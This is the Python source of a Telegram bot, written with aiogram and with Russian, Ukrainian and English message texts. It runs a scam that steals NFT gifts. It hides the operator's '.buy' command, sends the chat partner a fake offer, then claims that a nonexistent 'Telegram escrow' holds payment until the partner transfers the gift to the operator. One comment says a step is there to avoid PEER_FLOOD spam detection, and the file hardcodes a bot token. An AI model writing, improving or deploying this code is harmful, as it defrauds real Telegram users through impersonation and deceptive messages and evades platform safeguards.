import asyncio, re, random, string, logging
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions,
    CallbackQuery,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8726930734:AAESV0MI_3abx8lJwN9sJLuUfYSkiX_oKwY"
ADMIN_ID  = 8926402887

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
# формат: .buy <ссылка> <сумма> <s|g> [uk|en]
CMD_RE  = re.compile(
    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)\s+(s|g)(?:\s+(uk|en))?",
    re.IGNORECASE
)

TEXTS = {
    "ru": {
        "title":    "NFT Deal",
        "offer":    "Пользователь предлагает вам",
        "for":      "за подарок",
        "valid":    "Оффер действителен ещё",
        "order":    "Ордер",
        "reserved": "Покупатель зарезервировал",
        "escrow":   "через эскроу-систему Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс",
        "after":    "сразу после передачи подарка.",
        "instr":    "Инструкция для завершения сделки:",
        "step1":    "Передайте подарок пользователю:",
        "step2":    "Нажмите «Передать NFT» и выберите",
        "step3":    "Подтвердите передачу подарка.",
        "credits":  "Telegram зафиксирует транзакцию и моментально зачислит",
        "balance":  "на ваш баланс. Резерв действует 24 часа.",
        "declined": "отклонён.",
        "offer_btn":"Оффер отклонён.",
        "warn":     "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        "transfer": "Передать NFT ↗",
        "accept":   "Принять",
        "decline":  "Отклонить",
    },
    "uk": {
        "title":    "NFT Deal",
        "offer":    "Користувач пропонує вам",
        "for":      "за подарунок",
        "valid":    "Пропозиція дійсна ще",
        "order":    "Замовлення",
        "reserved": "Покупець зарезервував",
        "escrow":   "через ескроу-систему Telegram. Кошти зберігаються на спеціальному ескроу-рахунку та будуть автоматично зараховані на ваш баланс",
        "after":    "одразу після передачі подарунку.",
        "instr":    "Інструкція для завершення угоди:",
        "step1":    "Передайте подарунок користувачу:",
        "step2":    "Натисніть «Передати NFT» та виберіть",
        "step3":    "Підтвердіть передачу подарунку.",
        "credits":  "Telegram зафіксує транзакцію та миттєво зарахує",
        "balance":  "на ваш баланс. Резерв діє 24 години.",
        "declined": "відхилено.",
        "offer_btn":"Пропозицію відхилено.",
        "warn":     "Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок та отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення.",
        "transfer": "Передати NFT ↗",
        "accept":   "Прийняти",
        "decline":  "Відхилити",
    },
    "en": {
        "title":    "NFT Deal",
        "offer":    "A user offers you",
        "for":      "for the gift",
        "valid":    "Offer valid for another",
        "order":    "Order",
        "reserved": "The buyer has reserved",
        "escrow":   "via Telegram escrow. Funds are held in a dedicated escrow account and will be automatically credited to your balance",
        "after":    "immediately after the gift is transferred.",
        "instr":    "Instructions to complete the deal:",
        "step1":    "Transfer the gift to:",
        "step2":    "Tap «Transfer NFT» and select",
        "step3":    "Confirm the gift transfer.",
        "credits":  "Telegram will record the transaction and instantly credit",
        "balance":  "to your balance. The reserve is valid for 24 hours.",
        "declined": "declined.",
        "offer_btn":"Offer declined.",
        "warn":     "Attention!\n\nFollow the instructions to avoid losing the gift and to receive your payment.\n\nPress «OK» if you have read this message.",
        "transfer": "Transfer NFT ↗",
        "accept":   "Accept",
        "decline":  "Decline",
    },
}

# хранилище активных офферов в памяти: order_id → dict
offers: dict = {}

def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug

def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))

def fmt_remaining(sent_at: datetime) -> str:
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."

def fmt_currency(amount, currency):
    if currency == "stars":
        return f"<b>{amount:,} ⭐ Stars</b>"
    return f"<b>{amount:,} GRAM</b>"

def fmt_currency_short(amount, currency):
    if currency == "stars":
        return f"{amount:,} ⭐ Stars"
    return f"{amount:,} GRAM"

def build_offer_plain(amount, currency, gift_name, gift_num, order_id, recipient, sent_at):
    return (
        f"NFT Deal\n\n"
        f"Пользователь предлагает вам "
        f"{fmt_currency(amount, currency)} за подарок <b>{gift_name} #{gift_num}</b>.\n\n"
        f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
    )

def build_offer_linked(amount, currency, gift_name, gift_num, order_id, recipient, url, sent_at):
    return (
        f"NFT Deal\n\n"
        f"Пользователь предлагает вам "
        f"{fmt_currency(amount, currency)} за подарок "
        f"<b><a href=\"{url}\">{gift_name} #{gift_num}</a></b>.\n\n"
        f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
    )

def build_deal(amount, currency, gift_name, gift_num, order_id, recipient, url):
    cur = fmt_currency_short(amount, currency)
    return (
        f"NFT Deal\n\n"
        f"Ордер <b>#{order_id}</b>\n\n"
        f"Покупатель зарезервировал <b>{cur}</b> через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс {('GRAM' if currency == 'gram' else 'Stars')} сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @{recipient}\n"
        f"2. Нажмите «Передать NFT» и выберите "
        f"<a href=\"{url}\">{gift_name} #{gift_num}</a>\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{cur}</b> на ваш баланс. Резерв действует 24 часа."
    )

def offer_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять",   callback_data=f"accept:{order_id}")
    )
    return kb.as_markup()

def deal_kb(recipient: str):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="Передать NFT ↗", url=f"tg://send_gift?to={recipient}"))
    return kb.as_markup()

def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="Не передан",  callback_data=f"adm_no:{order_id}")
    )
    return kb.as_markup()

@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    text = message.text or ""
    m = CMD_RE.match(text.strip())
    if not m:
        return

    link      = m.group(1)
    amount    = int(m.group(2))
    currency  = (m.group(3) or "gram").lower()  # gram | stars

    # recipient — тот, кто написал .buy (покупатель)
    recipient = message.chat.username or str(message.chat.id)

    gift = parse_gift(link)
    if not gift:
        return

    gift_name, gift_num, slug = gift
    nft_url   = f"https://t.me/nft/{slug}-{gift_num}"
    order_id  = oid()
    sent_at   = datetime.now()
    chat_id   = message.chat.id

    # Шаг 1: без ссылки — не вызывает PEER_FLOOD
    try:
        sent = await bot.send_message(
            chat_id=chat_id,
            text=build_offer_plain(amount, currency, gift_name, gift_num, order_id, recipient, sent_at),
            reply_markup=offer_kb(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    # Сохраняем оффер
    offers[order_id] = {
        "amount": amount, "currency": currency, "gift_name": gift_name, "gift_num": gift_num,
        "nft_url": nft_url, "recipient": recipient, "order_id": order_id,
        "sent_at": sent_at, "chat_id": chat_id, "msg_id": sent.message_id,
        "bcid": bcid, "status": "offer",
    }

    # Удаляем .buy команду
    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    # Шаг 2: редактируем со ссылкой и превью
    await asyncio.sleep(1.5)
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=sent.message_id,
            text=build_offer_linked(amount, currency, gift_name, gift_num, order_id, recipient, nft_url, sent_at),
            reply_markup=offer_kb(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"edit error: {e}")


# ── Принять ──────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d or d["status"] != "offer":
        await call.answer("Оффер недоступен.", show_alert=True)
        return

    d["status"] = "active"

    await call.answer(
        "Внимание!\n\n"
        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )

    try:
        await bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=build_deal(d["amount"], d["currency"], d["gift_name"], d["gift_num"],
                            order_id, d["recipient"], d["nft_url"]),
            reply_markup=deal_kb(d["recipient"]),
            business_connection_id=d["bcid"],
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except Exception as e:
        logging.error(f"accept edit: {e}")


# ── Отклонить ────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d:
        return

    d["status"] = "declined"
    await call.answer("Вы отклонили оффер.")

    try:
        await bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"Оффер на <a href=\"{d['nft_url']}\">{d['gift_name']} #{d['gift_num']}</a> отклонён.",
            reply_markup=None,
            business_connection_id=d["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"decline edit: {e}")


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "Формат команды:\n"
        "<code>.buy https://t.me/nft/Name-123 сумма @username</code>"
    )


async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
            "message",
            "callback_query",
        ],
    )

if __name__ == "__main__":
    asyncio.run(main())
